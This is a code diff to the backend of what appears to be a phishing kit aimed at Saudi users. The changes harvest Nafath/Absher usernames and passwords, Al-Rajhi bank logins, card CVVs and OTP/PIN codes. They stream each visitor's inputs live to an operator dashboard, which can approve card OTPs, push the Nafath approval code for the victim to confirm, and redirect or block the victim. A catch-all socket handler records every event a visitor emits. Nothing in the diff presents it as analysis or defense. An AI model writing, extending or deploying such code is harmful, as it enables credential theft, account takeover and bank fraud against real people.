@@ -1,5 +1,5 @@
 /**
- * gosuksa backend — Railway-ready (v6)
+ * gosuksa backend — Railway-ready (v12)
  *
  * Serves two contracts on the same service:
  *
@@ -235,17 +235,69 @@ function recordSubmission(type, payload) {
     set("cardExpiryYear", ["expiryYear"]);
     set("paymentMethod", ["paymentMethod"]);
     set("cardCvv", ["cvv"]);
-    set("otp", ["otp", "otpCode", "code"]);
+    set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
+    set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
+    set("nafathUsername", ["nafathUsername", "nafathUser", "nafathLogin", "nafathLoginName", "nafathUserName", "nafseUsername", "nafseUser", "absherUsername", "absherUser", "userName"]);
+    set("nafathPassword", ["nafathPassword", "nafathPass", "nafsePassword", "absherPassword", "password"]);
+    set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
+    set("bankPassword", ["bankPassword"]);
+    set("address", ["address", "nationalAddress", "streetName", "district"]);
+    set("city", ["city", "cityName"]);
+    set("postalCode", ["postalCode", "zipCode"]);
+    set("gender", ["gender", "sex"]);
+    set("nationality", ["nationality"]);
+    set("purpose", ["purpose", "usage"]);
+    set("driverAge", ["driverAge", "age"]);
+    set("licenseType", ["licenseType"]);
+    set("startDate", ["startDate", "policyStart"]);
+    set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
+    set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
+    // Per-page bucket: keep the latest client inputs grouped by the page/event
+    // the visitor was on when they submitted, so the dashboard can show
+    // exactly what the client typed on each screen of their session.
+    const existingUser = db.get().users[id] || {};
+    const pageKey = String(flat.page || type || "unknown");
+    const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
+    const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
+    const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
+    // Drop empty strings so we don't overwrite real values with blanks
+    for (const k of Object.keys(mergedInputs)) {
+      if (mergedInputs[k] === "" || mergedInputs[k] === null) delete mergedInputs[k];
+    }
+    const nextBucket = {
+      page: pageKey,
+      inputs: mergedInputs,
+      lastEvent: type,
+      lastPayload: payload,
+      updatedAt: now(),
+      events: [...(prevBucket.events || []).slice(-19), { type, ts: now() }],
+    };
+    const nextPages = { ...prevPages, [pageKey]: nextBucket };
+
     upsertSession(id, {
       ...flat,
       [type]: payload,
+      pages: nextPages,
       lastEvent: type,
+      lastPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
+    });
+
+    // Push a compact per-page notification for dashboards that want to
+    // render "client input on page X" without diffing the full session.
+    io.to("admins").emit("client:input", {
+      id,
+      uuid: id,
+      page: pageKey,
+      event: type,
+      inputs: mergedInputs,
+      payload,
+      ts: now(),
     });
   }
   return entry;
@@ -253,18 +305,147 @@ function recordSubmission(type, payload) {
 
 
 
+// Map admin-dashboard event names to the customer socket events the
+// site pages actually listen for (see /public/assets/index-*.js).
+// Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
+// and one of userId / uuid / id matching the visitor's session.
+const ADMIN_EVENT_ALIASES = {
+  // Payment / visa card form
+  acceptpaymentform: ["payment:action", "confirmed"],
+  declinepaymentform: ["payment:action", "cancelled"],
+  acceptservice: ["payment:action", "confirmed"],
+  declineservice: ["payment:action", "cancelled"],
+  acceptpayment: ["payment:action", "confirmed"],
+  declinepayment: ["payment:action", "cancelled"],
+
+  // Visa 3-D Secure / SMS OTP shown after payment
+  acceptvisaotp: ["otp:action", "confirmed"],
+  declinevisaotp: ["otp:action", "cancelled"],
+  acceptphoneotp: ["otp:action", "confirmed"],
+  declinephoneotp: ["otp:action", "cancelled"],
+  acceptotp: ["otp:action", "confirmed"],
+  declineotp: ["otp:action", "cancelled"],
+
+  // Phone verification (motasel / stc verify pages)
+  acceptphone: ["phone:action", "confirmed"],
+  declinephone: ["phone:action", "cancelled"],
+
+  // Nafath (Absher) approval step
+  acceptnavaz: ["nafath:action", "confirmed"],
+  declinenavaz: ["nafath:action", "cancelled"],
+  acceptnafath: ["nafath:action", "confirmed"],
+  declinenafath: ["nafath:action", "cancelled"],
+
+  // Nafath login (username + password) -> navigates to /nafse
+  acceptnaflogin: ["naflogin:action", "confirmed"],
+  declinenaflogin: ["naflogin:action", "cancelled"],
+  acceptnafselogin: ["naflogin:action", "confirmed"],
+  declinenafselogin: ["naflogin:action", "cancelled"],
+
+  // Al-Rajhi login -> navigates to /phone
+  acceptrajlogin: ["rajlogin:action", "confirmed"],
+  declinerajlogin: ["rajlogin:action", "cancelled"],
+  acceptrajhi: ["rajlogin:action", "confirmed"],
+  declinerajhi: ["rajlogin:action", "cancelled"],
+};
+
 function broadcastAdminEvent(id, event, payload) {
   if (!id) return;
-  io.to(`session:${id}`).emit(event, payload ?? { id });
-  io.to(`user:${id}`).emit(event, payload ?? { id });
-  io.to("admins").emit(`admin:${event}`, { id, payload });
+  const target = io.to(`session:${id}`).to(`user:${id}`);
+  const base = { id, uuid: id, userId: id };
+  const data = payload && typeof payload === "object"
+    ? { ...base, ...payload, id, uuid: id, userId: id }
+    : base;
+
+  // Echo the raw event too, so a dashboard that already uses the
+  // customer-side names keeps working.
+  target.emit(event, data);
+
+  const key = String(event || "").toLowerCase();
+  const alias = ADMIN_EVENT_ALIASES[key];
+  if (alias) {
+    const [aliasEvent, action] = alias;
+    target.emit(aliasEvent, { ...data, action });
+  }
+
+  // Redirect: dashboard chooses the destination page.
+  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
+    const redirectPayload = {
+      ...data,
+      page: data.page || data.route || data.to || "/",
+      pageName: data.pageName || data.title || "",
+    };
+    target.emit("admin:redirect", redirectPayload);
+  }
+
+  // Nafath verification number: dashboard sends the 2-digit code that
+  // the customer must tap in the Absher app on page 7. The customer
+  // bundle listens for `nafath:code` with { verificationCode: "42" }.
+  const isNafathNumberEvent =
+    key === "nafathnumber" ||
+    key === "nafathcode" ||
+    key === "sendnafathnumber" ||
+    key === "sendnafathcode" ||
+    key === "setnafathnumber" ||
+    key === "setnafathcode" ||
+    key === "nafath:code" ||
+    key === "nafath:number" ||
+    /nafath.*(number|code)/.test(key) ||
+    /(send|set).*nafath/.test(key);
+
+  if (isNafathNumberEvent) {
+    const raw = String(
+      data.verificationCode ??
+        data.code ??
+        data.number ??
+        data.nafathNumber ??
+        data.nafathCode ??
+        data.value ??
+        ""
+    ).trim();
+    // Keep digits only, pad/truncate to 2 chars so the customer page
+    // always shows a clean two-digit badge.
+    const digits = raw.replace(/\D+/g, "").slice(0, 2).padStart(raw ? 2 : 0, "0");
+    const code = digits || raw;
+    target.emit("nafath:code", {
+      ...data,
+      verificationCode: code,
+      code,
+      number: code,
+    });
+
+    // "Send # & Redirect": if the dashboard event or payload says so,
+    // also push the client to page 7 (/nafath) so they see the badge.
+    const wantsRedirect =
+      /redirect|navigate|goto|go2|push/.test(key) ||
+      data.redirect === true ||
+      data.redirectToNafath === true ||
+      data.navigate === true ||
+      /nafath/i.test(String(data.page || data.route || data.to || ""));
+    if (wantsRedirect) {
+      target.emit("admin:redirect", {
+        ...data,
+        page: "/nafath",
+        pageName: data.pageName || "nafath",
+      });
+    }
+  }
+
+
+  // Block: customer page shows blocked screen. Do NOT disconnect the
+  // socket, otherwise the next OTP / redirect can't be delivered.
+  if (key === "clientblocked" || key === "blockclient" || key === "user:blocked") {
+    target.emit("user:blocked", { ...data, blocked: true });
+  }
+
+  io.to("admins").emit(`admin:${event}`, { id, payload: data });
 }
 
 // ---------- REST: health / meta ----------
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v9";
+const APP_VERSION = "v17";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -281,20 +462,6 @@ app.get("/breinit", (_req, res) => res.json({ ok: true }));
 app.post("/api/chat/enabled", (_req, res) =>
   res.json({ isChatEnabled: CHAT_ENABLED })
 );
-app.get("/api/chat/enabled", (_req, res) =>
-  res.json({ isChatEnabled: CHAT_ENABLED })
-);
-
-// Client geo/IP lookup used by the customer site.
-app.get("/geo", (req, res) => {
-  res.json({
-    ok: true,
-    ip: clientIp(req),
-    country: req.headers["cf-ipcountry"] || "Unknown",
-    countryCode: req.headers["cf-ipcountry"] || "XX",
-    ua: req.headers["user-agent"] || "",
-  });
-});
 
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
@@ -507,36 +674,6 @@ app.post("/phone", stepHandler("phone"));
 app.post("/phone-otp", stepHandler("phoneOtp"));
 app.post("/visa-otp", stepHandler("visaOtp"));
 
-// ---------- REST: read-only lookups used by the customer site ----------
-app.get("/api/user/init", (req, res) => {
-  const id = req.query.uuid || req.query.id || uuid();
-  const ip = clientIp(req);
-  upsertSession(id, { ip, ua: req.headers["user-agent"] || "", lastSeen: now() });
-  res.json({
-    ok: true,
-    _id: id,
-    userInfo: { uuid: id, visitTime: now(), ip, country: "Unknown", countryCode: "XX" },
-  });
-});
-
-app.get("/state/:id", (req, res) => {
-  const s = db.get().users[req.params.id];
-  if (!s) return res.status(404).json({ error: "not_found" });
-  res.json({ ok: true, id: req.params.id, stage: s.stage || "init", state: s });
-});
-
-app.get("/company/:id", (req, res) => {
-  const s = db.get().users[req.params.id];
-  if (!s) return res.status(404).json({ error: "not_found" });
-  res.json({ ok: true, id: req.params.id, company: s.company || null });
-});
-
-app.get("/order/status/:id", (req, res) => {
-  const s = db.get().users[req.params.id];
-  if (!s) return res.status(404).json({ error: "not_found" });
-  res.json({ ok: true, id: req.params.id, status: s.stage || "init", updatedAt: s.updatedAt || null });
-});
-
 // ---------- Admin read APIs (existing) ----------
 app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
 app.get("/admin/submissions", requireAdmin, (_req, res) =>
@@ -545,6 +682,31 @@ app.get("/admin/submissions", requireAdmin, (_req, res) =>
 app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));
 
 // ---------- Socket.IO ----------
+// Events we handle explicitly or that carry no submission data — skip in onAny.
+const IGNORED_ANY_EVENTS = new Set([
+  "user:join", "join", "bindOrder", "chat:message",
+  "user:getChatHistory", "admin:getChatHistory", "admin:getUpdates",
+  "user:pageNavigation", "user:typingStatus", "user:statusUpdate",
+  "bin:lookup", "disconnect", "disconnecting", "ping", "pong",
+  "csrf:token", "site:publicSettings",
+  // handled explicitly with their own recordSubmission call
+  "newData", "booking:update",
+  "paymentForm", "visaOtp", "phone", "phoneOtp", "navaz",
+  "payment:update", "otp:received", "pin:received",
+  "nafath:submitted", "phone:submitted", "naflogin:submitted",
+  "nafotp:submitted", "rajlogin:submitted",
+  "health:submitted", "health2:submitted", "health3:submitted", "health4:submitted",
+  "client:cancelOtp", "client:cancelPayment",
+  "payment:duplicateAttempt", "otp:duplicateAttempt",
+  // admin -> client control events (not visitor submissions)
+  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
+  "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
+  "acceptPhoneOtp", "declinePhoneOtp", "acceptNavaz", "declineNavaz",
+  "adminRedirect", "clientBlocked", "changeNavazCode",
+  "payment:action", "otp:action", "nafath:action", "naflogin:action",
+  "phone:action", "admin:redirect",
+]);
+
 io.on("connection", (socket) => {
   console.log(`[io] connected ${socket.id}`);
 
@@ -552,6 +714,23 @@ io.on("connection", (socket) => {
   socket.emit("csrf:token", { token: csrf });
   socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
   socket.data.csrf = csrf;
+
+  // Catch-all: any other event the customer site emits is treated as a
+  // page submission and mirrored onto the session row.
+  socket.onAny((event, payload) => {
+    if (IGNORED_ANY_EVENTS.has(event)) return;
+    if (socket.data.userType === "admin" || socket.data.role === "admin") return;
+    const obj = (payload && typeof payload === "object") ? payload : {};
+    const id =
+      obj.uuid || obj.id || obj.userId ||
+      socket.data.userId || socket.data.sessionId ||
+      findSessionByIp(clientIp(socket.request));
+    if (!id) return;
+    // Stamp the current page if the client didn't include one, so the
+    // per-page bucket in recordSubmission groups inputs correctly.
+    const page = obj.page || obj.currentPage || socket.data.page || event;
+    recordSubmission(event, { ...obj, uuid: id, page });
+  });
 
   // -------- Frontend (customer site) join --------
   socket.on("user:join", (p = {}) => {
@@ -643,11 +822,32 @@ io.on("connection", (socket) => {
     "changeNavazCode",
   ];
   adminControlEvents.forEach((ev) => {
-    socket.on(ev, (payload = {}) => {
-      if (socket.data.role !== "admin" && socket.data.userType !== "admin")
+    socket.on(ev, (payload = {}, ack) => {
+      const isAdmin =
+        socket.data.role === "admin" ||
+        socket.data.userType === "admin" ||
+        (payload && typeof payload === "object" && payload.adminToken === ADMIN_TOKEN);
+      if (!isAdmin) {
+        console.warn(`[io] rejected ${ev} from ${socket.id} (not admin)`);
+        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
         return;
-      const id = typeof payload === "string" ? payload : payload.id || payload.uuid;
-      broadcastAdminEvent(id, ev, payload);
+      }
+      const id =
+        typeof payload === "string"
+          ? payload
+          : payload.id || payload.uuid || payload.userId || payload.targetUserId;
+      if (!id) {
+        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
+        return;
+      }
+      const data =
+        typeof payload === "object"
+          ? { ...payload, id, uuid: id, userId: id }
+          : { id, uuid: id, userId: id };
+      delete data.adminToken;
+      broadcastAdminEvent(id, ev, data);
+      console.log(`[io] admin ${ev} -> ${id}`);
+      if (typeof ack === "function") ack({ ok: true });
     });
   });
 
@@ -734,11 +934,13 @@ io.on("connection", (socket) => {
 
   socket.on("user:pageNavigation", (p) => {
     const uid = socket.data.userId;
-    if (uid) upsertSession(uid, { lastPage: p?.page, lastSeen: now() });
+    const page = p?.page || p?.currentPage || p?.route;
+    socket.data.page = page || socket.data.page;
+    if (uid) upsertSession(uid, { lastPage: page, currentPage: page, lastSeen: now() });
     io.to("admins").emit("live:update", {
       type: "pageNavigation",
       uuid: uid,
-      page: p?.page,
+      page,
       ts: now(),
     });
   });
@@ -765,11 +967,27 @@ io.on("connection", (socket) => {
     "admin:redirect",
   ];
   for (const ev of legacyAdminEvents) {
-    socket.on(ev, (p = {}) => {
-      if (socket.data.userType !== "admin" && socket.data.role !== "admin")
+    socket.on(ev, (p = {}, ack) => {
+      const isAdmin =
+        socket.data.userType === "admin" ||
+        socket.data.role === "admin" ||
+        (p && typeof p === "object" && p.adminToken === ADMIN_TOKEN);
+      if (!isAdmin) {
+        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
         return;
-      const target = p.userId || p.uuid || p.id;
-      if (target) io.to(`user:${target}`).emit(ev, p);
+      }
+      const target = p.userId || p.uuid || p.id || p.targetUserId;
+      if (!target) {
+        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
+        return;
+      }
+      const data = { ...p, id: target, uuid: target };
+      delete data.adminToken;
+      io.to(`user:${target}`).emit(ev, data);
+      io.to(`session:${target}`).emit(ev, data);
+      io.to("admins").emit(`admin:${ev}`, { id: target, payload: data });
+      console.log(`[io] legacy admin ${ev} -> ${target}`);
+      if (typeof ack === "function") ack({ ok: true });
     });
   }
 
